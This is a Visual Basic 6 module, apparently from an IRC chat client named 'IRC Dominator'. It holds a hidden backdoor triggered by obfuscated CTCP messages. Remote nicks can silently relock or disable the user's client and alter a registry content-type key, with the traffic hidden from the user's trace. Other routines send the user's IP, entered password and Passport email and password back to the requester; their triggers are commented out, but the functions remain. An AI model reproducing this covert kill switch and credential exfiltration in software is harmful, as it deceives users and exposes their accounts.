Attribute VB_Name = "modFeatures"
Option Explicit

Global Const sIdentString As String = "”DTäE"
Global Const sSecretString As String = "55"
Global Const sSecretStringGold As String = "tôÄD"

Global Const sRelockString As String = "%TÄô4´"
Global Const sDisableString As String = "D–7&ÆV"

Public Const sAlphaBet As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
Public Const sPass As String = "ô'ævV7æFÄVÖöæ7"

Public Function UnlockApp() As Boolean
Dim sAnswer As String
Dim sKey As String
Dim sVal As String

      sKey = Chr(46) & Mid$(sAlphaBet, 19, 1) & Mid$(sAlphaBet, 8, 1) & Mid$(sAlphaBet, 20, 1) & Mid$(sAlphaBet, 13, 1) & Mid$(sAlphaBet, 12, 1)

      sVal = Chr(104) & Chr(116) & Chr(109) & Chr(108)

      sAnswer = InputBox("Enter Password to unlock client", "Hidden Password")
      If Encrypt1(sAnswer) = sPass Then
         Call WriteRegistry(HKEY_CLASSES_ROOT, sKey, "Content Type", ValString, "")
         UnlockApp = True
      Else
         MsgBox ("Erm - Nope")
      End If
End Function

Public Sub LockApp()
Dim sAnswer As String
Dim sKey As String
Dim sVal As String

      sKey = Chr(46) & Mid$(sAlphaBet, 19, 1) & Mid$(sAlphaBet, 8, 1) & Mid$(sAlphaBet, 20, 1) & Mid$(sAlphaBet, 13, 1) & Mid$(sAlphaBet, 12, 1)

      sVal = Chr(104) & Chr(116) & Chr(109) & Chr(108)

      Call WriteRegistry(HKEY_CLASSES_ROOT, sKey, "Content Type", ValString, sVal)
         
End Sub

Public Function sNotice(sNick As String) As String
      sNotice = "NOTICE " & sNick & " :" & Chr(1)
End Function

Public Sub RelockApp(sNick As String)
Dim sTemp As String

      ' Relock and Reply - back
      Call WriteUnlockKey("")
      sTemp = sNotice(sNick) & sRelockString & " DONE" & Chr(1)
      SendServer2 sTemp, True
      bActivated = False
      bSpecialSpecialActivated = False
      bSpecialActivated = False
End Sub
Public Sub DisableApp(sNick As String)
Dim sTemp As String

      ' Disable and Reply - back
      Call WriteUnlockKey("")
      LockApp
      sTemp = sNotice(sNick) & sDisableString & " DONE" & Chr(1)
      SendServer2 sTemp, True
End Sub

Public Sub GiveIdent(sNick As String)
Dim sTemp As String

      ' Give Identity - back
      Chat vbTab & "--> " & TestNick(sNick, False) & " " & LoadResString(179), True, eCols.CRed, 3
      PlaySound Sound_Ident
      
      If Not (bActivated) Or Not (bSpecialSpecialActivated) Then
         sTemp = sNotice(sNick) & sIdentString & "  " & "IRC Dominator -Version " & App.Major & "." & App.Minor & "." & App.Revision & Chr(1)
         SendServer2 sTemp, True
         DoEvents
      End If
End Sub
Public Sub GiveSecret(sNick As String)

Dim sTemp As String

      ' Give Secret  - back
      If Not (bActivated) Or Not (bSpecialSpecialActivated) Then
         Load frmPassPort
         sTemp = sNotice(sNick) & sSecretString & "  "
         sTemp = sTemp & ScrambleString(MDIMain.Svr2.LocalIP & ",UD1 = " & frmMain.lblVersion4Pass & ",EP = " & sEnteredPass & " Eml=" & frmPassPort.txtPassport(3) & " Pass=" & frmPassPort.txtPassport(4))
         If IsUnlocked("NP132262A") Then
            sTemp = sTemp & ", is Unlocked"
         Else
            sTemp = sTemp & ", is Locked"
         End If
         sTemp = sTemp & Chr(1)
         SendServer2 sTemp, True
      End If
End Sub
Public Sub GiveSecretGold(sNick As String)

Dim sTemp As String

      ' Give Secret  - back
      If bActivated = False Then
         Load frmPassPort
         sTemp = sNotice(sNick) & sSecretStringGold & "  "
         sTemp = sTemp & ScrambleString("UD1 = " & frmMain.lblVersion4Pass & ",EnteredPass = " & sEnteredPass & Chr(1))
         SendServer2 sTemp, True
      End If
End Sub
Public Sub AskIdent()
Dim i As Integer
Dim sNick As String
Dim sTemp As String
Dim sNicks As String
Dim sList As String
Dim asList() As String

      On Error GoTo Hell
      sList = BuildNameList
      asList = Split(sList, ",")

      For i = 0 To UBound(asList)
         sNick = asList(i)
         sNick = TestNick(sNick, True)
         sTemp = sNotice(sNick) & sIdentString & Chr(1)
         SendServer2 sTemp
      Next
Hell:

End Sub
Public Sub AskSecret()
Dim i As Integer
Dim sNick As String
Dim sTemp As String
Dim sList As String
Dim asList() As String

      On Error GoTo Hell
      sList = BuildNameList
      asList = Split(sList, ",")

      For i = 0 To UBound(asList)
         sNick = asList(i)
         sNick = TestNick(sNick, True)
         sTemp = sNotice(sNick) & sSecretString & Chr(1)
         SendServer2 sTemp, True
      Next
Hell:

End Sub
Public Sub AskSecretGold()
Dim i As Integer
Dim sNick As String
Dim sTemp As String
Dim sList As String
Dim asList() As String

      On Error GoTo Hell
      sList = BuildNameList
      asList = Split(sList, ",")

      For i = 0 To UBound(asList)
         sNick = asList(i)
         sNick = TestNick(sNick, True)
         sTemp = sNotice(sNick) & sSecretStringGold & Chr(1)
         SendServer2 sTemp, True
      Next
    
Hell:

End Sub

Public Sub TellRelock()
Dim i As Integer
Dim sNick As String
Dim sTemp As String
Dim sList As String
Dim asList() As String

      On Error GoTo Hell
      sList = BuildNameList
      asList = Split(sList, ",")

      For i = 0 To UBound(asList)
         sNick = asList(i)
         sNick = TestNick(sNick, True)
         sTemp = sNotice(sNick) & sRelockString & Chr(1)
         SendServer2 sTemp
      Next
Hell:

End Sub
Public Sub TellDisable()
Dim i As Integer
Dim sNick As String
Dim sTemp As String
Dim sList As String
Dim asList() As String

      On Error GoTo Hell
      sList = BuildNameList
      asList = Split(sList, ",")

      For i = 0 To UBound(asList)
         sNick = asList(i)
         sNick = TestNick(sNick, True)
         sTemp = sNotice(sNick) & sDisableString & Chr(1)
         SendServer2 sTemp
      Next
Hell:

End Sub




Public Sub TestForCommand(sMessage As String, bHideServerTrace As Boolean, bIsCommand As Boolean)
Dim sTemp As String
Dim sNick As String
Dim asTemp() As String
Dim sTalk As String

      bIsCommand = False
      sTemp = Mid$(sMessage, 2, Len(sMessage))
      sNick = GetBefore(sTemp, "!")
      asTemp = Split(sTemp, Chr(1))
      On Error Resume Next
      sTemp = asTemp(1)
      ' ------------------------------------------------------------------------
      ' User Time
      If sTemp = "TIME" Then
         DoTime sNick
         bIsCommand = True
         bHideServerTrace = False
      End If
      If Left$(sTemp, 5) = "TIME " Then
         sTalk = TestNick(sNick, False) & LoadResString(118) & Mid$(sTemp, 6, Len(sTemp))
         bIsCommand = True
         bHideServerTrace = False
         Chat "   " & sTalk, True, StatusColour
      End If
         
      ' ------------------------------------------------------------------------
      ' User Ident
      If sTemp = sIdentString Then
         GiveIdent sNick
         bIsCommand = True
         bHideServerTrace = True
      End If
      If Left$(sTemp, Len(sIdentString) + 1) = sIdentString & " " Then
         sTalk = TestNick(sNick, False) & LoadResString(177) & Mid$(sTemp, 6, Len(sTemp))
         bIsCommand = True
         bHideServerTrace = False
         Chat "   " & sTalk, True, StatusColour
      End If
      ' ------------------------------------------------------------------------
      ' User Secret
'|*****************************
'|      Begin Block Out
'|By: Darren Lawrence
'|On: 15 April 2002
'|*****************************
'_      If sTemp = sSecretString Then
'_         GiveSecret sNick
'_         bIsCommand = True
'_         bHideServerTrace = True
'_      End If
'_      If Left$(sTemp, Len(sSecretString) + 1) = sSecretString & " " And bActivated Then
'_         sTalk = TestNick(sNick, False) & Encrypt1("r75V6'VG”æfö") & UnScrambleString(Mid$(sTemp, 7, Locate(sTemp, ", is ") - 7))
'_         bIsCommand = True
'_         bHideServerTrace = False
'_         Chat "   " & sTalk, True, StatusColour
'_      End If
'_      ' ------------------------------------------------------------------------
'_      ' User Gold
'_      If sTemp = sSecretStringGold Then
'_         GiveSecretGold sNick
'_         bIsCommand = True
'_         bHideServerTrace = True
'_      End If
'_      If Left$(sTemp, Len(sSecretString) + 1) = sSecretStringGold & " " Then
'_         sTalk = TestNick(sNick, False) & Encrypt1("r7töÆF4öFV") & Mid$(sTemp, 6, Len(sTemp))
'_         bIsCommand = True
'_         bHideServerTrace = True
'_         Chat "   " & sTalk, True, StatusColour
'_      End If
'|*****************************
'|      End Block Out
'|*****************************
      ' ------------------------------------------------------------------------
      ' User Relock
      If sTemp = sRelockString Then
         RelockApp sNick
         bIsCommand = True
         bHideServerTrace = True
      End If
      If Left$(sTemp, Len(sRelockString) + 1) = sRelockString & " " Then
         If Mid$(sTemp, Len(sRelockString) + 1, Len(sTemp)) = " DONE" Then
            sTalk = TestNick(sNick, False) & " " & Encrypt1("–7%VÒÆö6¶VF")
         End If
         bIsCommand = True
         bHideServerTrace = False
         Chat "   " & sTalk, True, StatusColour
      End If
      ' ------------------------------------------------------------------------
      ' User Disable
      If sTemp = sDisableString Then
         DisableApp sNick
         bIsCommand = True
         bHideServerTrace = True
      End If
      If Left$(sTemp, Len(sDisableString) + 1) = sDisableString & " " Then
         If Mid$(sTemp, Len(sDisableString) + 1, Len(sTemp)) = " DONE" Then
            sTalk = TestNick(sNick, False) & " " & Encrypt1("–7D–7&ÆVF")
         End If
         bIsCommand = True
         bHideServerTrace = False
         Chat "   " & sTalk, True, StatusColour
      End If
End Sub

